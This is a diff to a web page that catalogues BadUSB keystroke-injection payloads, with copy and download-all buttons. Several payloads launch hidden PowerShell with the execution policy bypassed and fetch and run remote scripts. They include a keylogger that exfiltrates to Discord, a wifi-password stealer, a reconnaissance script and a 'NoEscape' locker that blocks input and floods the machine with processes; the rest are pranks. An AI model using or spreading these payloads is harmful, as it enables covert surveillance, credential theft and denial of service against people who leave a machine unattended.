+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://jakoby.lol/kiv' -O "$D\\js.zip";Expand-Archive "$D\\js.zip" -Des $D -Force;. "$D\\js\\js.ps1"
+ENTER`
+            },
+            {
+                name: "ZRK Keylogger",
+                category: "Surveillance",
+                description: "PowerShell-based keylogger that exfiltrates logs to Discord.",
+                code: `GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
+ENTER`
+            },
+            {
+                name: "ZRK Wallpaper-Troll",
+                category: "Prank",
+                description: "Changes the target's wallpaper to taunt them.",
+                code: `GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/b8n | iex
+DELAY 500
+ENTER`
+            },
+            {
+                name: "ZRK We-Found-You",
+                category: "Pranks",
+                description: "Opens a map in the target's web browser with their current location.",
+                code: `GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/yzb | iex
+ENTER`
+            },
+            {
+                name: "ZRK Wifi Grabber",
+                category: "Network Exploitation",
+                description: "Grabs target's wifi passwords and uploads them to Dropbox or Discord.",
+                code: `GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/e8v | iex
+ENTER`
+            },
+            {
+                name: "ZRK YouTube-TripWire",
+                category: "Prank",
+                description: "Plays a YouTube video after mouse movement is detected.",
+                code: `GUI r
+DELAY 500
+STRING powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 3}};saps https://youtu.be/sOLIdqpzrW4;sleep 3;$o=New-Object -ComObject WScript.Shell;$o.SendKeys('f')
+ENTER`
+            },
+            {
+                name: "ZRK ADV-Recon",
+                category: "Reconnaissance",
+                description: "Performs advanced reconnaissance of the target's PC.",
+                code: `GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
+ENTER`
+            },
+            {
+                name: "ZRK Hacker Goose",
+                category: "Prank",
+                description: "Simulates a goose hacking the target's PC in real-time.",
+                code: `GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\\hg.zip";Expand-Archive "$D\\hg.zip" -Des $D -Force;. "$D\\hg\\main.ps1"
+ENTER`
+            },
+            {
+                name: "ZRK iPhone Dialer",
+                category: "Mobile Prank",
+                description: "Dials a specified number on an unlocked iPhone.",
+                code: `DEFINE #PHONE-APP-NAME example
+DEFINE #NUMBER example
+
+GUI SPACE
+DELAY 300
+STRING #PHONE-APP-NAME
+ENTER
+DELAY 1000
+BACKSPACE
+STRING #NUMBER
+DELAY 500
+ENTER`
+            },
+            {
+                name: "ZRK Try To Catch Me",
+                category: "Prank",
+                description: "Downloads and runs a Python script to prank the target.",
+                code: `DEFINE SCRIPT-PY-LINK example.com
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+STRING Invoke-WebRequest -Uri "
+STRING SCRIPT-PY-LINK
+STRING " -OutFile "script.py"
+ENTER
+DELAY 500
+
+STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
+DELAY 1000
+ALT F4`
+            },
+            {
+                name: "ZRK Admin PowerShell",
+                category: "System Access",
+                description: "Starts a PowerShell with administrator permissions in Windows.",
+                code: `DELAY 1000
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+LEFT_ARROW
+DELAY 500
+ENTER
+
+DELAY 2000
+STRINGLN Get-ExecutionPolicy -List
+DELAY 500
+STRINGLN Set-ExecutionPolicy Bypass
+DELAY 500
+STRINGLN Get-ExecutionPolicy -List
+DELAY 500
+
+ALT F4`
+            },
+            {
+                name: "ZRK Automailer",
+                category: "Prank",
+                description: "Snaps screen, opens Outlook, sends a message to various people with pre-configured text, adds screenshot and opens up a muted 1-hour rickroll YouTube video once done.",
+                code: `DEFAULT_DELAY 350
+
+REM Take screenshot
+SHIFT WINDOWS S
+DELAY 200
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 300
+
+REM Open Outlook (Change E-Mail and text)
+GUI r
+DELAY 100
+STRING outlook.exe /c ipm.note /m ratcode404@notarealmail.com?v=1&cc=ratcode405@notarealmail.com
+ENTER
+DELAY 500
+STRING Subject goes here.
+TAB
+STRING Hello Ratcode!
+ENTER 
+STRING I like to leave my device unlocked and would want to invite you to some free dinner tonight.
+ENTER
+STRING xoxo
+
+REM Paste Screenshot in Mail (CTRL V)
+SHIFT INSERT
+DELAY 200
+
+REM Send Mail
+ALT S
+ENTER
+DELAY 200
+
+REM Rickroll, Mute and Fullscreen (Can adjust link obviously)
+GUI r
+DELAY 100
+STRING https://www.youtube.com/watch?v=zL19uMsnpSU
+ENTER
+DELAY 300
+M
+DELAY 200
+F`
+            },
+            {
+                name: "ZRK Broken Capslock",
+                category: "Prank",
+                description: "Selects all words and capitalizes them, works best when in a word doc.",
+                code: `DELAY 300
+CTRL+A
+DELAY 500
+SHIFT+F3`
+            },
+            {
+                name: "ZRK Broken Capslock (Save Version)",
+                category: "Prank",
+                description: "Selects all words, capitalizes them, and saves the document.",
+                code: `DELAY 300
+CTRL+A
+DELAY 500
+SHIFT+F3
+DELAY 500
+CTRL+S`
+            },
+            {
+                name: "ZRK Cartman Spam",
+                category: "Prank",
+                description: "Opens multiple YouTube tabs playing Cartman's voice.",
+                code: `DELAY 1000
+GUI r
+DELAY 1500
+STRING powershell -w h $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i=0;$i -lt $k;$i++){$o.SendKeys([char] 175)}; 1..10|foreach {saps https://www.youtube.com/watch?v=U3sAkAWfxLY;sleep 1;$o.SendKeys('f')}
+ENTER`
+            },
+            {
+                name: "ZRK Fake Windows Update",
+                category: "Prank",
+                description: "Opens a fake Windows update screen in full-screen mode.",
+                code: `DELAY 300
+GUI r
+DELAY 500
+STRING microsoft-edge:https://fakeupdate.net/win10ue/
+ENTER
+DELAY 5000
+F11`
+            },
+            {
+                name: "ZRK Hacker Typer",
+                category: "Prank",
+                description: "Opens a harmless website and types like a hacker.",
+                code: `DELAY 1500
+GUI r
+DELAY 1000
+STRING http://geektyper.com/plain
+DELAY 50
+ENTER
+DELAY 2000
+F11
+DELAY 500
+STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop
+DELAY 500
+STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop
+DELAY 500
+STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwer
+DELAY 500
+STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop
+DELAY 500
+STRING qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop`
+            },
+            {
+                name: "ZRK NoEscape",
+                category: "Malware",
+                description: "A dangerous malware that locks the user out of their system.",
+                code: `REM !!!WARNING!!! This script is extremely dangerous and should never be used without explicit permission.
+REM It can cause permanent damage to the target system. For educational purposes only.
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+STRING $code = @"
+STRING using System;
+STRING using System.Runtime.InteropServices;
+STRING public class Locker {
+STRING     [DllImport("user32.dll")]
+STRING     public static extern bool BlockInput(bool fBlockIt);
+STRING }
+STRING "@
+STRING Add-Type -TypeDefinition $code -Language CSharp
+STRING [Locker]::BlockInput($true)
+STRING while($true){Start-Process -WindowStyle Hidden calc; Start-Sleep -Milliseconds 10}
+ENTER
+
+REM This script is part of the ZRK NoEscape attack simulation.
+REM It demonstrates the potential severity of malicious scripts.
+REM Never run this on systems without proper authorization.`
+            },
+            // Add more attack objects as needed
+        ];
+
+        function displayAttacks(filteredAttacks = attacks) {
+            const attackList = document.getElementById('attackList');
+            attackList.innerHTML = '';
+
+            filteredAttacks.forEach(attack => {
+                const attackItem = document.createElement('div');
+                attackItem.className = `attack-item${attack.name === "ZRK NoEscape" ? " zrk-noescape" : ""}`;
+                attackItem.innerHTML = `
+                    <div class="attack-header">
+                        <h3 class="attack-name">${attack.name}</h3>
+                        <p class="attack-category">${attack.category}</p>
+                    </div>
+                    <div class="attack-content">
+                        <p class="attack-description">${attack.description}</p>
+                        <pre class="attack-code">${attack.code}
+                            <button class="copy-btn">Copy</button>
+                            <button class="download-btn">Download</button>
+                        </pre>
+                    </div>
+                `;
+
+                const copyBtn = attackItem.querySelector('.copy-btn');
+                copyBtn.addEventListener('click', () => {
+                    navigator.clipboard.writeText(attack.code);
+                    copyBtn.textContent = 'Copied!';
+                    setTimeout(() => {
+                        copyBtn.textContent = 'Copy';
+                    }, 2000);
                 });
+
+                const downloadBtn = attackItem.querySelector('.download-btn');
+                downloadBtn.addEventListener('click', () => {
+                    const blob = new Blob([attack.code], {type: 'text/plain'});
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `${attack.name.replace(/\s+/g, '_').toLowerCase()}.txt`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                });
+
+                attackList.appendChild(attackItem);
+            });
+        }
+
+        function populateCategories() {
+            const categories = [...new Set(attacks.map(attack => attack.category))];
+            const categoriesContainer = document.getElementById('categories');
+
+            categories.forEach(category => {
+                const categoryBtn = document.createElement('button');
+                categoryBtn.className = 'category';
+                categoryBtn.textContent = category;
+                categoryBtn.addEventListener('click', () => {
+                    const filteredAttacks = attacks.filter(attack => attack.category === category);
+                    displayAttacks(filteredAttacks);
+                });
+                categoriesContainer.appendChild(categoryBtn);
+            });
+        }
+
+        const searchInput = document.getElementById('search');
+        searchInput.addEventListener('input', () => {
+            const searchTerm = searchInput.value.toLowerCase();
+            const filteredAttacks = attacks.filter(attack => 
+                attack.name.toLowerCase().includes(searchTerm) || 
+                attack.description.toLowerCase().includes(searchTerm) ||
+                attack.category.toLowerCase().includes(searchTerm)
+            );
+            displayAttacks(filteredAttacks);
+        });
+
+        const downloadAllBtn = document.getElementById('downloadAllBtn');
+        downloadAllBtn.addEventListener('click', () => {
+            const zip = new JSZip();
+            attacks.forEach(attack => {
+                zip.file(`${attack.name.replace(/\s+/g, '_').toLowerCase()}.txt`, attack.code);
+            });
+            zip.generateAsync({type: "blob"}).then(function(content) {
+                saveAs(content, "zrk_badusb_scripts.zip");
             });
         });
 
-        // Timeline animation
-        const timelineItems = document.querySelectorAll('.timeline-item');
-        const animateTimeline = () => {
-            timelineItems.forEach(item => {
-                const itemTop = item.getBoundingClientRect().top;
-                if (itemTop < window.innerHeight - 100) {
-                    item.classList.add('animate');
-                }
-            });
-        };
-        window.addEventListener('scroll', animateTimeline);
-        animateTimeline(); // Initial check on load
-
-        // Discord link click handler
-        discordLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            discordModal.style.display = 'block';
-            setTimeout(() => {
-                discordModal.style.display = 'none';
-                window.open('https://discord.gg/Aqh7QrPh', '_blank');
-            }, 3000);
-        });
-
-        // Close modal if clicked outside
-        window.onclick = (event) => {
-            if (event.target == discordModal) {
-                discordModal.style.display = 'none';
-            }
-        };
-    });
+        populateCategories();
+        displayAttacks();
     </script>
 </body>
 </html>
